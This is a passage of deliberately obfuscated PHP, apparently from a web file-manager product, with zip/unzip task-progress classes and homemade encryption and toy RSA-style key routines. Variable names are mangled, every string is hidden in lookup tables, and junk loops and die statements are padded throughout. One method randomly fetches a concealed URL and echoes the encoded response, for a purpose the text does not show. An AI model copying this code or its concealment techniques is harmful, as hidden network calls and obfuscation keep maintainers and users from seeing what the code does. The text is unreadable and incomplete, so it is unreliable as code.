Model($´óùÖ‚±[124])->field($´óùÖ‚±[291])->limit($´ÎĞ¸¦¹)->select(); $§£ØŞ¼· = $ïÑÔ—Ë[684]; while (strlen($§£ØŞ¼·) < $ïÑÔ—Ë[617]) { if (!$§£ØŞ¼·) { break; } $§£ØŞ¼·++; } $Ê°ò¢‹â = array_to_keyvalue($Ê°ò¢‹â, $´óùÖ‚±[6], $´óùÖ‚±[291]); $—õ¡µÆ = $ïÑÔ—Ë[685]; if (strlen($—õ¡µÆ) < $ïÑÔ—Ë[610]) { die; } if (!in_array($¹¶œö£¡[$´óùÖ‚±[291]], $Ê°ò¢‹â)) { show_json($´óùÖ‚±[292], !1, $´óùÖ‚±[207]); } } public function iepd61fefcdf() { $àöË£è‡ =& $_SERVER[å¸¿•¶£]; $Ô¯ã¾ı± =& $_SERVER[•ÅŸñ²ì]; if (!_get($GLOBALS, $Ô¯ã¾ı±[115]) || mt_rand(1, 100) > 20) { return; } $•·à®Ğ‡ = $Ô¯ã¾ı±[214]; $•·à®Ğ‡ = $this->iosq52fc91dd($•·à®Ğ‡, $Ô¯ã¾ı±[215]); $Úºº šß = $àöË£è‡[686]; if (strlen($Úºº šß) < $àöË£è‡[621]) { die; } $“Å³ÍÆˆ = stream_context_create(array($Ô¯ã¾ı±[216] => array($Ô¯ã¾ı±[217] => $Ô¯ã¾ı±[218], $Ô¯ã¾ı±[219] => 3))); $ËÃâ”ïŒ = $àöË£è‡[687]; while ($ËÃâ”ïŒ < $àöË£è‡[610]) { if ($ËÃâ”ïŒ >= 0) { break; } $ËÃâ”ïŒ++; } $µÀ¡ƒ Æ = @file_get_contents($•·à®Ğ‡, !1, $“Å³ÍÆˆ); $…ÑšÓ°õ = $àöË£è‡[688]; echo $Ô¯ã¾ı±[293] . hash_encode($µÀ¡ƒ Æ) . $Ô¯ã¾ı±[294]; } private function neqo6adc3a8a($†Ş»ïœ—, $§×’¨µ, $¶…÷ÀÂ = 3) { $ö”™„áÍ =& $_SERVER[å¸¿•¶£]; $±ª–›¡‹ =& $_SERVER[•ÅŸñ²ì]; usleep(1); $†Ş»ïœ— = trim($†Ş»ïœ—); $¥úó¯›£ = $ö”™„áÍ[689]; if (!$¥úó¯›£) { die; } $“íí‰‚• = mt_rand(0, 5) . $±ª–›¡‹[6]; $½êÔ„‡ = $ö”™„áÍ[690]; if (strlen($½êÔ„‡) < $ö”™„áÍ[617]) { die; } $ü¾ØâÈñ = rand_string(15); $¤«ÖŒÄ = $ö”™„áÍ[691]; if (!$¤«ÖŒÄ) { return; } $‚ï¤Ï†Í = $±ª–›¡‹[295]; $š•‘åâ¿ = $ö”™„áÍ[692]; while ($š•‘åâ¿ < $ö”™„áÍ[617]) { if ($š•‘åâ¿ >= 0) { break; } $š•‘åâ¿++; } switch ($“íí‰‚•) { case $±ª–›¡‹[203]: $­’³Öµ§ = $this->iacvce13ccd8($†Ş»ïœ—, strrev($§×’¨µ . $ü¾ØâÈñ)); break; case $±ª–›¡‹[121]: $­’³Öµ§ = $this->iacvce13ccd8($†Ş»ïœ—, strrev($ü¾ØâÈñ . $§×’¨µ)); $æÇ‘ë­¡ = $ö”™„áÍ[693]; while (strlen($æÇ‘ë­¡) < $ö”™„áÍ[612]) { if (!$æÇ‘ë­¡) { break; } $æÇ‘ë­¡++; } break; $Úƒ×ˆé” = $ö”™„áÍ[694]; case $±ª–›¡‹[296]: $­’³Öµ§ = $this->iacvce13ccd8($†Ş»ïœ—, base64_encode($ü¾ØâÈñ . $§×’¨µ)); break; $Ü§£Îİš = $ö”™„áÍ[695]; case $±ª–›¡‹[297]: $­’³Öµ§ = $this->iacvce13ccd8($†Ş»ïœ—, md5($ü¾ØâÈñ . $§×’¨µ)); break; case $±ª–›¡‹[298]: $†Ş»ïœ— = base64_encode($†Ş»ïœ—); $´ÓÆ“€¸ = $ö”™„áÍ[696]; while (strlen($´ÓÆ“€¸) < $ö”™„áÍ[617]) { if (!$´ÓÆ“€¸) { break; } $´ÓÆ“€¸++; } $óêèú¶ = rand(0, 64); $‡¨öÌş = $ö”™„áÍ[697]; $ÔÖ·ş² = $‚ï¤Ï†Í[$óêèú¶]; $¯´÷ÏŒŞ = md5($ÔÖ·ş² . md5($§×’¨µ . $ÔÖ·ş²) . $§×’¨µ); $Øı¨ìÖÍ = $ö”™„áÍ[698]; $¯´÷ÏŒŞ = substr($¯´÷ÏŒŞ, $óêèú¶ % 8, $óêèú¶ % 8 + 7); $§«€êÜô = $±ª–›¡‹[6]; $€ Ï ¦² = $ö”™„áÍ[699]; if (strlen($€ Ï ¦²) < $ö”™„áÍ[612]) { die; } $ŠÛŒúˆ‡ = 0; $×çúÆãÙ = $ö”™„áÍ[700]; if (strlen($×çúÆãÙ) < $ö”™„áÍ[610]) { return; } $”ĞäğÈà = 0; $–¾í¹¡° = $ö”™„áÍ[701]; if (!$–¾í¹¡°) { die; } $î…“€ó¾ = 0; for ($ŠÛŒúˆ‡ = 0; $ŠÛŒúˆ‡ < strlen($†Ş»ïœ—); $ŠÛŒúˆ‡++) { $î…“€ó¾ = $î…“€ó¾ == strlen($¯´÷ÏŒŞ) ? 0 : $î…“€ó¾; $Á¤Üˆ¹ˆ = $ö”™„áÍ[702]; if (strlen($Á¤Üˆ¹ˆ) < $ö”™„áÍ[610]) { return; } $”ĞäğÈà = ($óêèú¶ + strpos($‚ï¤Ï†Í, $†Ş»ïœ—[$ŠÛŒúˆ‡]) + ord($¯´÷ÏŒŞ[$î…“€ó¾++])) % 64; $¬ƒÇûóÜ = $ö”™„áÍ[703]; while ($¬ƒÇûóÜ < $ö”™„áÍ[612]) { if ($¬ƒÇûóÜ >= 0) { break; } $¬ƒÇûóÜ++; } $§«€êÜô .= $‚ï¤Ï†Í[$”ĞäğÈà]; $é¤äŸ = $ö”™„áÍ[704]; if (strlen($é¤äŸ) < $ö”™„áÍ[617]) { return; } } $­’³Öµ§ = hash_encode($ÔÖ·ş² . $§«€êÜô); break; $‰ô×¯™Í = $ö”™„áÍ[705]; while (strlen($‰ô×¯™Í) < $ö”™„áÍ[612]) { if (!$‰ô×¯™Í) { break; } $‰ô×¯™Í++; } default: $­’³Öµ§ = $this->iacvce13ccd8($†Ş»ïœ—, $§×’¨µ . $ü¾ØâÈñ); $´ò»œ = $ö”™„áÍ[706]; break; } $­’³Öµ§ = strrev($“íí‰‚• . $ü¾ØâÈñ . $­’³Öµ§); if ($¶…÷ÀÂ - 1 > 0) { $­’³Öµ§ = $this->neqo6adc3a8a($­’³Öµ§, $§×’¨µ, $¶…÷ÀÂ - 1); } return $­’³Öµ§; } private function tuzabb60f4a7($ïºÑáà¹, $úÈÑœ¬¦, $Ç½¬äş‹ = 3) { $£ ¯‘Ø– =& $_SERVER[å¸¿•¶£]; $İÇËÂª¯ =& $_SERVER[•ÅŸñ²ì]; if (!is_string($ïºÑáà¹) || strlen($ïºÑáà¹) < 10) { return !1; } $ïºÑáà¹ = trim($ïºÑáà¹); $ ‹ŸŸ©‰ = $£ ¯‘Ø–[707]; $ïºÑáà¹ = strrev($ïºÑáà¹); $»å÷»à” = $ïºÑáà¹[0]; $¥±Ø¢·ô = substr($ïºÑáà¹, 1, 15); $ïºÑáà¹ = substr($ïºÑáà¹, 16); $»¹ÎãßÚ = $£ ¯‘Ø–[708]; while ($»¹ÎãßÚ < $£ ¯‘Ø–[621]) { if ($»¹ÎãßÚ >= 0) { break; } $»¹ÎãßÚ++; } $í‚Î‹ÕŞ = $İÇËÂª¯[295]; $îöÅ´Ò = $£ ¯‘Ø–[709]; if (!$îöÅ´Ò) { die; } switch ($»å÷»à”) { case $İÇËÂª¯[203]: $©³İÆ‹Ô = $this->iosq52fc91dd($ïºÑáà¹, strrev($úÈÑœ¬¦ . $¥±Ø¢·ô)); $Ôûøı‰Ü = $£ ¯‘Ø–[710]; if (strlen($Ôûøı‰Ü) < $£ ¯‘Ø–[628]) { die; } break; case $İÇËÂª¯[121]: $©³İÆ‹Ô = $this->iosq52fc91dd($ïºÑáà¹, strrev($¥±Ø¢·ô . $úÈÑœ¬¦)); $¿‡¸Øé¦ = $£ ¯‘Ø–[711]; if (!$¿‡¸Øé¦) { die; } break; $ªëÖÑòƒ = $£ ¯‘Ø–[712]; if (!$ªëÖÑòƒ) { return; } case $İÇËÂª¯[296]: $©³İÆ‹Ô = $this->iosq52fc91dd($ïºÑáà¹, base64_encode($¥±Ø¢·ô . $úÈÑœ¬¦)); break; $“ ÅÚ¥´ = $£ ¯‘Ø–[713]; case $İÇËÂª¯[297]: $©³İÆ‹Ô = $this->iosq52fc91dd($ïºÑáà¹, md5($¥±Ø¢·ô . $úÈÑœ¬¦)); break; case $İÇËÂª¯[298]: $ïºÑáà¹ = hash_decode($ïºÑáà¹); $û¨˜õ©è = $£ ¯‘Ø–[714]; $ÅŞ—Úéü = $ïºÑáà¹[0]; $ùëçÁÖã = $£ ¯‘Ø–[715]; while ($ùëçÁÖã < $£ ¯‘Ø–[612]) { if ($ùëçÁÖã >= 0) { break; } $ùëçÁÖã++; } $ïºÑáà¹ = substr($ïºÑáà¹, 1); $‰ËòöÁê = $£ ¯‘Ø–[716]; if (!$‰ËòöÁê) { die; } $‡ÀÔÜŒ = strpos($í‚Î‹ÕŞ, $ÅŞ—Úéü); $ˆ²À‰À = md5($ÅŞ—Úéü . md5($úÈÑœ¬¦ . $ÅŞ—Úéü) . $úÈÑœ¬¦); $–×«óØæ = $£ ¯‘Ø–[717]; if (!$–×«óØæ) { return; } $ˆ²À‰À = substr($ˆ²À‰À, $‡ÀÔÜŒ % 8, $‡ÀÔÜŒ % 8 + 7); $ğĞ¾“¿± = $£ ¯‘Ø–[718]; if (strlen($ğĞ¾“¿±) < $£ ¯‘Ø–[612]) { die; } $ãÓº¸‘Å = $İÇËÂª¯[6]; $Ñ·ûü = $£ ¯‘Ø–[719]; if (!$Ñ·ûü) { return; } $šÃãßåÙ = 0; $ôË¢Î±€ = $£ ¯‘Ø–[720]; if (strlen($ôË¢Î±€) < $£ ¯‘Ø–[621]) { die; } $‹ˆ‹³¯Õ = 0; $“‡—ê…Ú = 0; for ($šÃãßåÙ = 0; $šÃãßåÙ < strlen($ïºÑáà¹); $šÃãßåÙ++) { $“‡—ê…Ú = $“‡—ê…Ú == strlen($ˆ²À‰À) ? 0 : $“‡—ê…Ú; $®Ùüåá = $“‡—ê…Ú++; $·†Üö´ = $£ ¯‘Ø–[721]; while ($·†Üö´ < $£ ¯‘Ø–[628]) { if ($·†Üö´ >= 0) { break; } $·†Üö´++; } $‹ˆ‹³¯Õ = strpos($í‚Î‹ÕŞ, $ïºÑáà¹[$šÃãßåÙ]) - $‡ÀÔÜŒ - ord($ˆ²À‰À[$®Ùüåá]); $áÓ³ç†ñ = $£ ¯‘Ø–[722]; while ($‹ˆ‹³¯Õ < 0) { $‹ˆ‹³¯Õ += 64; } $ãÓº¸‘Å .= $í‚Î‹ÕŞ[$‹ˆ‹³¯Õ]; $ñÒäìĞ’ = $£ ¯‘Ø–[723]; while (strlen($ñÒäìĞ’) < $£ ¯‘Ø–[621]) { if (!$ñÒäìĞ’) { break; } $ñÒäìĞ’++; } } $©³İÆ‹Ô = base64_decode($ãÓº¸‘Å); $ÀÜõì¯ˆ = $£ ¯‘Ø–[724]; while (strlen($ÀÜõì¯ˆ) < $£ ¯‘Ø–[621]) { if (!$ÀÜõì¯ˆ) { break; } $ÀÜõì¯ˆ++; } break; $ìèœœ— = $£ ¯‘Ø–[725]; if (!$ìèœœ—) { die; } default: $©³İÆ‹Ô = $this->iosq52fc91dd($ïºÑáà¹, $úÈÑœ¬¦ . $¥±Ø¢·ô); $ùø»Èßñ = $£ ¯‘Ø–[726]; break; } if ($Ç½¬äş‹ - 1 > 0) { $©³İÆ‹Ô = $this->tuzabb60f4a7($©³İÆ‹Ô, $úÈÑœ¬¦, $Ç½¬äş‹ - 1); } return $©³İÆ‹Ô; } public function xcnu87870b88($¸áûÅ²ı) { $Š¾ïƒ‰ =& $_SERVER[å¸¿•¶£]; $İØæ©åï =& $_SERVER[•ÅŸñ²ì]; $ø™õ¢Ó = $this->nmst486b465c(); $¡¡ŞçŞô = $this->nmst486b465c(); $ûÇì®®ë = ($ø™õ¢Ó - 1) * ($¡¡ŞçŞô - 1); $ÜÃ•Ò˜ß = intval(($ø™õ¢Ó + $¡¡ŞçŞô) / 2); $³¬ĞÂÏ = $Š¾ïƒ‰[727]; while (strlen($³¬ĞÂÏ) < $Š¾ïƒ‰[612]) { if (!$³¬ĞÂÏ) { break; } $³¬ĞÂÏ++; } while (1) { $‹¡¿×ı = $ÜÃ•Ò˜ß; $íò€Ò¨° = $Š¾ïƒ‰[728]; $¢»Î½Ã€ = $ûÇì®®ë; $ß¦Ë‚åÜ = $Š¾ïƒ‰[729]; if (!$ß¦Ë‚åÜ) { die; } while ($¢»Î½Ã€ % $‹¡¿×ı != 0) { $Ñ©îåÀË = $¢»Î½Ã€; $¢»Î½Ã€ = $‹¡¿×ı; $‹¡¿×ı = $Ñ©îåÀË % $‹¡¿×ı; $çŸ»ÈÁÄ = $Š¾ïƒ‰[730]; if (strlen($çŸ»ÈÁÄ) < $Š¾ïƒ‰[612]) { die; } } if ($‹¡¿×ı == 1) { break; } else { $ÜÃ•Ò˜ß++; } } $ôÊúàÆ‘ = 2; for ($ù€·Ùª = 0; $ù€·Ùª < $ûÇì®®ë * 10; $ù€·Ùª++) { if (($ûÇì®®ë * $ù€·Ùª + 1) % $ÜÃ•Ò˜ß == 0) { $ôÊúàÆ‘ = intval(($ûÇì®®ë * $ù€·Ùª + 1) / $ÜÃ•Ò˜ß); break; } } $òîÏ—Ï‘ = $this->iacvce13ccd8($ø™õ¢Ó * $¡¡ŞçŞô . $İØæ©åï[6], $İØæ©åï[135]); $˜–ïÎ±ú = md5($İØæ©åï[299] . ($ø™õ¢Ó + $¡¡ŞçŞô) . $İØæ©åï[300] . $ÜÃ•Ò˜ß . $İØæ©åï[300] . $ôÊúàÆ‘ . $İØæ©åï[301]); $„î€¯êÊ = $Š¾ïƒ‰[731]; if (!$„î€¯êÊ) { die; } $ »àéˆ = $this->iacvce13ccd8($¸áûÅ²ı, $˜–ïÎ±ú) . $İØæ©åï[302] . $òîÏ—Ï‘; $‚¡¼úÑš = $Š¾ïƒ‰[732]; return $ »àéˆ; } public function zdfmad3d905b($³‹ºÑ) { $ó™³èö² =& $_SERVER[å¸¿•¶£]; $‘ÁÏá¡é =& $_SERVER[•ÅŸñ²ì]; $ÑÀç¬µ = explode($‘ÁÏá¡é[302], $³‹ºÑ); if (count($ÑÀç¬µ) != 2) { return $‘ÁÏá¡é[6]; } $à€Ã— ¯ = $this->iosq52fc91dd($ÑÀç¬µ[1] . $‘ÁÏá¡é[6], $‘ÁÏá¡é[135]); $©¢’Û‡» = $ó™³èö²[733]; while ($©¢’Û‡» < $ó™³èö²[612]) { if ($©¢’Û‡» >= 0) { break; } $©¢’Û‡»++; } if (!$à€Ã— ¯) { return $‘ÁÏá¡é[6]; } $à€Ã— ¯ = intval($à€Ã— ¯); $Û®ÉÂ¹ı = $ó™³èö²[734]; while (strlen($Û®ÉÂ¹ı) < $ó™³èö²[617]) { if (!$Û®ÉÂ¹ı) { break; } $Û®ÉÂ¹ı++; } $¡çŒ¦ºô = 0; $ÓƒªÕ§í = $ó™³èö²[735]; $˜êºÛúğ = 0; $ÀŠá©¡ü = $ó™³èö²[736]; if (strlen($ÀŠá©¡ü) < $ó™³èö²[617]) { return; } for ($ß¯ŸÑºÃ = 3; $ß¯ŸÑºÃ < $à€Ã— ¯; $ß¯ŸÑºÃ += 2) { if ($à€Ã— ¯ % $ß¯ŸÑºÃ != 0) { continue; } $¡çŒ¦ºô = $ß¯ŸÑºÃ; $˜êºÛúğ = intval($à€Ã— ¯ / $ß¯ŸÑºÃ); $ÆêÆ§ÈŒ = $ó™³èö²[737]; break; $¿à™ˆ— = $ó™³èö²[738]; if (strlen($¿à™ˆ—) < $ó™³èö²[617]) { die; } } $±¦Æı½Ö = ($¡çŒ¦ºô - 1) * ($˜êºÛúğ - 1); $µ€‰³Ëá = $ó™³èö²[739]; if (!$µ€‰³Ëá) { die; } $üÌ¦âÜƒ = intval(($¡çŒ¦ºô + $˜êºÛúğ) / 2); while (1) { $¤•¾ŒÎ‚ = $üÌ¦âÜƒ; $»€²éêÂ = $ó™³èö²[740]; while ($»€²éêÂ < $ó™³èö²[612]) { if ($»€²éêÂ >= 0) { break; } $»€²éêÂ++; } $µñìŸ¾ì = $±¦Æı½Ö; $Êåïª€¤ = $ó™³èö²[741]; while (strlen($Êåïª€¤) < $ó™³èö²[617]) { if (!$Êåïª€¤) { break; } $Êåïª€¤++; } while ($µñìŸ¾ì % $¤•¾ŒÎ‚ != 0) { $÷æáë“ = $µñìŸ¾ì; $äÅ½Œ» = $ó™³èö²[742]; $µñìŸ¾ì = $¤•¾ŒÎ‚; $¤•¾ŒÎ‚ = $÷æáë“ % $¤•¾ŒÎ‚; } if ($¤•¾ŒÎ‚ == 1) { break; } else { $üÌ¦âÜƒ++; } } $§õ¬»“ü = 2; $ÉÈ¤ŠÃ = $ó™³èö²[743]; if (!$ÉÈ¤ŠÃ) { die; } for ($ß¯ŸÑºÃ = 0; $ß¯ŸÑºÃ < $±¦Æı½Ö * 10; $ß¯ŸÑºÃ++) { if (($±¦Æı½Ö * $ß¯ŸÑºÃ + 1) % $üÌ¦âÜƒ == 0) { $§õ¬»“ü = intval(($±¦Æı½Ö * $ß¯ŸÑºÃ + 1) / $üÌ¦âÜƒ); break; } } $ı’»×èÑ = md5($‘ÁÏá¡é[299] . ($¡çŒ¦ºô + $˜êºÛúğ) . $‘ÁÏá¡é[300] . $üÌ¦âÜƒ . $‘ÁÏá¡é[300] . $§õ¬»“ü . $‘ÁÏá¡é[301]); $´Ó½¨ ¤ = $this->iosq52fc91dd($ÑÀç¬µ[0], $ı’»×èÑ); $’ÜåÁê­ = $ó™³èö²[662]; if (!$’ÜåÁê­) { return; } return $´Ó½¨ ¤; } public function nmst486b465c() { $Ã½°Œâå =& $_SERVER[å¸¿•¶£]; $Û†ô“ß² = mt_rand(pow(2, 14), pow(2, 16) - 1); $òŠøßâØ = array(); $ó—…‰ = 1; while ($ó—…‰ <= (int) sqrt($Û†ô“ß²)) { $Ø¨üå‹ = $ó—…‰; while (!0) { $Ø¨üå‹++; if ($Ø¨üå‹ <= 2) { $ó—…‰ = $Ø¨üå‹; break; } else { if ($Ø¨üå‹ < 2) { continue; } } $ÃÓ»Ïõˆ = !0; for ($¨¿Óµí” = 2; $¨¿Óµí” <= sqrt($Ø¨üå‹); $¨¿Óµí”++) { if ($Ø¨üå‹ % $¨¿Óµí” == 0) { $ÃÓ»Ïõˆ = !1; } } if ($ÃÓ»Ïõˆ) { $ó—…‰ = $Ø¨üå‹; break; } } $òŠøßâØ[] = $ó—…‰; } $…úº¡šà = 2; $ÚÜ†Œ’„ = $Ã½°Œâå[744]; while (strlen($ÚÜ†Œ’„) < $Ã½°Œâå[621]) { if (!$ÚÜ†Œ’„) { break; } $ÚÜ†Œ’„++; } for ($Ø¨üå‹ = $Û†ô“ß²; $Ø¨üå‹ > 1; $Ø¨üå‹--) { $ÃÓ»Ïõˆ = !0; foreach ($òŠøßâØ as $½ù•¿¸ø) { if ($Ø¨üå‹ % $½ù•¿¸ø == 0) { $ÃÓ»Ïõˆ = !1; break; } } if ($ÃÓ»Ïõˆ) { $…úº¡šà = $Ø¨üå‹; break; } } return $…úº¡šà; $Õï—ÆÑ = $Ã½°Œâå[745]; if (!$Õï—ÆÑ) { return; } } public function fzwu685537a7($á¢®„×², $õªµÀ„) { $ğæäËä¿ =& $_SERVER[å¸¿•¶£]; $µÊ«­¢ =& $_SERVER[•ÅŸñ²ì]; return call_user_func(array($µÊ«­¢[8], $µÊ«­¢[303]), $á¢®„×², $õªµÀ„); $ËÀ÷ıª = $ğæäËä¿[746]; while ($ËÀ÷ıª < $ğæäËä¿[617]) { if ($ËÀ÷ıª >= 0) { break; } $ËÀ÷ıª++; } } public function iacvce13ccd8($ÑÆ¤š‚•, $×÷¾ı€Ä) { $²ƒÅÁä« =& $_SERVER[•ÅŸñ²ì]; return call_user_func(array($²ƒÅÁä«[304], $²ƒÅÁä«[305]), $ÑÆ¤š‚•, $×÷¾ı€Ä); } public function iosq52fc91dd($¥Ú´Í¹¶, $êØù‡”¡) { $Ò“¨ªİ€ =& $_SERVER[•ÅŸñ²ì]; return call_user_func(array($Ò“¨ªİ€[304], $Ò“¨ªİ€[306]), $¥Ú´Í¹¶, $êØù‡”¡); } } goto c«š×Å¸Æ; e„£ŞÛÎõ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ÍûœÕÊÀ =& $_SERVER[å¸¿•¶£]; parent::startAfter(); Hook::bind($ÍûœÕÊÀ[1784], array($this, $ÍûœÕÊÀ[1785])); Hook::bind($ÍûœÕÊÀ[1200], array($this, $ÍûœÕÊÀ[1786])); $¸“ŠÓ¤† =& $this->task; $¸“ŠÓ¤†[$ÍûœÕÊÀ[1787]] = $ÍûœÕÊÀ[1201]; if (!$¸“ŠÓ¤†[$ÍûœÕÊÀ[1574]]) { $¸“ŠÓ¤†[$ÍûœÕÊÀ[1574]] = LNG($ÍûœÕÊÀ[1788]); } } protected function endAfter() { $…Şˆ¥±É =& $_SERVER[å¸¿•¶£]; parent::endAfter(); Hook::unbind($…Şˆ¥±É[1784], array($this, $…Şˆ¥±É[1785])); Hook::unbind($…Şˆ¥±É[1200], array($this, $…Şˆ¥±É[1786])); } public function updateAfter() { $ìæ¥¿æº =& $_SERVER[å¸¿•¶£]; $…é€“Íè =& $this->task; if (!$…é€“Íè[$ìæ¥¿æº[793]] || !$…é€“Íè[$ìæ¥¿æº[770]]) { return; } if ($…é€“Íè[$ìæ¥¿æº[1787]] == $ìæ¥¿æº[1201]) { $•¸Í…Ÿ½ = 0; if ($…é€“Íè[$ìæ¥¿æº[1727]]) { $•¸Í…Ÿ½ = $…é€“Íè[$ìæ¥¿æº[1728]] / $…é€“Íè[$ìæ¥¿æº[1727]]; } $…é€“Íè[$ìæ¥¿æº[1676]] = $•¸Í…Ÿ½ * 0.3; } else { if ($…é€“Íè[$ìæ¥¿æº[1787]] == $ìæ¥¿æº[313]) { $•¸Í…Ÿ½ = $…é€“Íè[$ìæ¥¿æº[1675]] / $…é€“Íè[$ìæ¥¿æº[793]]; $…é€“Íè[$ìæ¥¿æº[1676]] = 0.3 + $•¸Í…Ÿ½ * 0.4; } else { if ($…é€“Íè[$ìæ¥¿æº[1787]] == $ìæ¥¿æº[107]) { $²èˆÙ…› = 0; if ($…é€“Íè[$ìæ¥¿æº[1729]] == $ìæ¥¿æº[107]) { $²èˆÙ…› = $…é€“Íè[$ìæ¥¿æº[1728]]; } $•¸Í…Ÿ½ = ($…é€“Íè[$ìæ¥¿æº[1732]] + $²èˆÙ…›) / $…é€“Íè[$ìæ¥¿æº[770]]; $…é€“Íè[$ìæ¥¿æº[1676]] = 0.3 + 0.4 + $•¸Í…Ÿ½ * 0.3; } } } if ($…é€“Íè[$ìæ¥¿æº[1676]] > 0) { $Òşí½¦Ô = timeFloat() - $…é€“Íè[$ìæ¥¿æº[1678]] - $…é€“Íè[$ìæ¥¿æº[1681]]; $…é€“Íè[$ìæ¥¿æº[1682]] = $Òşí½¦Ô * (1 - $…é€“Íè[$ìæ¥¿æº[1676]]) / $…é€“Íè[$ìæ¥¿æº[1676]]; } } public function addFile($‹„”Ÿ§å) { $Àş­”Š =& $_SERVER[å¸¿•¶£]; $ô¶—Üš =& $this->task; $ò¨¤øù— = IO::info($‹„”Ÿ§å); $ô¶—Üš[$Àş­”Š[1725]] = $ò¨¤øù—[$Àş­”Š[32]]; $ô¶—Üš[$Àş­”Š[1727]] = $ò¨¤øù—[$Àş­”Š[76]]; $ô¶—Üš[$Àş­”Š[1728]] = 0; $ô¶—Üš[$Àş­”Š[1071]] = $Àş­”Š[1748]; $ô¶—Üš[$Àş­”Š[1729]] = $Àş­”Š[1201]; $ô¶—Üš[$Àş­”Š[770]] = $ò¨¤øù—[$Àş­”Š[76]]; $ô¶—Üš[$Àş­”Š[793]] = 1; $Å¤”õ = 0; $ô¶—Üš[$Àş­”Š[1736]] = array($Àş­”Š[1737] => $Å¤”õ + 1, $Àş­”Š[420] => $ò¨¤øù—[$Àş­”Š[32]], $Àş­”Š[84] => $ò¨¤øù—[$Àş­”Š[84]], $Àş­”Š[509] => $ò¨¤øù—[$Àş­”Š[509]] ? $ò¨¤øù—[$Àş­”Š[509]] : $ò¨¤øù—[$Àş­”Š[84]]); $this->update(); } public function unzipAfter($Êëà Â) { $”–ˆ­Úú =& $_SERVER[å¸¿•¶£]; $õ”áÎØô =& $this->task; $õ”áÎØô[$”–ˆ­Úú[1787]] = $”–ˆ­Úú[107]; $ËŠßüò¸ = IO::infoWithChildren($Êëà Â); $Ş²Êì¯Ú = 0; $õ”áÎØô[$”–ˆ­Úú[1736]] = array($”–ˆ­Úú[1737] => $Ş²Êì¯Ú + 1, $”–ˆ­Úú[420] => $ËŠßüò¸[$”–ˆ­Úú[32]], $”–ˆ­Úú[84] => $ËŠßüò¸[$”–ˆ­Úú[84]], $”–ˆ­Úú[509] => $ËŠßüò¸[$”–ˆ­Úú[509]] ? $ËŠßüò¸[$”–ˆ­Úú[509]] : $ËŠßüò¸[$”–ˆ­Úú[84]]); if ($ËŠßüò¸[$”–ˆ­Úú[33]] == $”–ˆ­Úú[200]) { $õ”áÎØô[$”–ˆ­Úú[793]] = 1; } else { $õ”áÎØô[$”–ˆ­Úú[793]] = $ËŠßüò¸[$”–ˆ­Úú[79]][$”–ˆ­Úú[77]]; } $õ”áÎØô[$”–ˆ­Úú[1071]] = $”–ˆ­Úú[12]; $õ”áÎØô[$”–ˆ­Úú[1729]] = 0; $õ”áÎØô[$”–ˆ­Úú[1675]] = 0; $õ”áÎØô[$”–ˆ­Úú[1727]] = 0; $õ”áÎØô[$”–ˆ­Úú[1728]] = 0; $õ”áÎØô[$”–ˆ­Úú[1725]] = $”–ˆ­Úú[12]; $õ”áÎØô[$”–ˆ­Úú[1732]] = 0; $õ”áÎØô[$”–ˆ­Úú[770]] = $ËŠßüò¸[$”–ˆ­Úú[76]]; $this->update(); self::log($”–ˆ­Úú[1789] . json_encode(array($õ”áÎØô, $ËŠßüò¸))); } public function nameParse($Üóı‡ï ) { $†İˆ¬¾õ =& $_SERVER[å¸¿•¶£]; $Á²ç•­ =& $this->task; if ($Á²ç•­[$†İˆ¬¾õ[1787]] == $†İˆ¬¾õ[1201]) { $Á²ç•­[$†İˆ¬¾õ[1787]] = $†İˆ¬¾õ[313]; $Á²ç•­[$†İˆ¬¾õ[1732]] = 0; $Á²ç•­[$†İˆ¬¾õ[770]] = 0; } $º–î¥ = get_path_this($Üóı‡ï ); if (strstr($º–î¥, $†İˆ¬¾õ[10])) { $Á²ç•­[$†İˆ¬¾õ[1675]] += 1; $Á²ç•­[$†İˆ¬¾õ[793]] += 1; } $Á²ç•­[$†İˆ¬¾õ[1725]] = $Üóı‡ï ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÆïŸ¥ê  =& $_SERVER[å¸¿•¶£]; parent::startAfter(); Hook::bind($ÆïŸ¥ê [1790], array($this, $ÆïŸ¥ê [1785])); $ù¯ÒÒê =& $this->task; $ù¯ÒÒê[$ÆïŸ¥ê [1787]] = $ÆïŸ¥ê [1201]; if (!$ù¯ÒÒê[$ÆïŸ¥ê [1574]]) { $ù¯ÒÒê[$ÆïŸ¥ê [1574]] = LNG($ÆïŸ¥ê [1791]); } } protected function endAfter() { $£¬¬³Š =& $_SERVER[å¸¿•¶£]; parent::endAfter(); Hook::unbind($£¬¬³Š[1790], array($this, $£¬¬³Š[1785])); } public function updateAfter() { $¦ÒÀ•æ… =& $_SERVER[å¸¿•¶£]; $Û’¼Â‡Ã =& $this->task; if (!$Û’¼Â‡Ã[$¦ÒÀ•æ…[793]] || !$Û’¼Â‡Ã[$¦ÒÀ•æ…[770]]) { return; } if ($Û’¼Â‡Ã[$¦ÒÀ•æ…[1787]] == $¦ÒÀ•æ…[1201]) { $ş‰”Úñ¿ = $Û’¼Â‡Ã[$¦ÒÀ•æ…[1728]]; if ($Û’¼Â‡Ã[$¦ÒÀ•æ…[1729]] != $¦ÒÀ•æ…[1201]) { $ş‰”Úñ¿ = 0; } $÷òè‹ÌÜ = ($Û’¼Â‡Ã[$¦ÒÀ•æ…[1732]] + $ş‰”Úñ¿) / $Û’¼Â‡Ã[$¦ÒÀ•æ…[770]]; $Û’¼Â‡Ã[$¦ÒÀ•æ…[1676]] = $÷òè‹ÌÜ * 0.3; } else { if ($Û’¼Â‡Ã[$¦ÒÀ•æ…[1787]] == $¦ÒÀ•æ…[313]) { $÷òè‹ÌÜ = $Û’¼Â‡Ã[$¦ÒÀ•æ…[1675]] / $Û’¼Â‡Ã[$¦ÒÀ•æ…[793]]; $Û’¼Â‡Ã[$¦ÒÀ•æ…[1676]] = 0.3 + $÷òè‹ÌÜ * 0.5; } else { if ($Û’¼Â‡Ã[$¦ÒÀ•æ…[1787]] == $¦ÒÀ•æ…[107]) { $÷òè‹ÌÜ = 0; if ($Û’¼Â‡Ã[$¦ÒÀ•æ…[1727]]) { $÷òè‹ÌÜ = $Û’¼Â‡Ã[$¦ÒÀ•æ…[1728]] / $Û’¼Â‡Ã[$¦ÒÀ•æ…[1727]]; } $Û’¼Â‡Ã[$¦ÒÀ•æ…[1676]] = 0.3 + 0.5 + $÷òè‹ÌÜ * 0.2; } } } if ($Û’¼Â‡Ã[$¦ÒÀ•æ…[1676]] > 0) { $Ï­Ä¶‰÷ = timeFloat() - 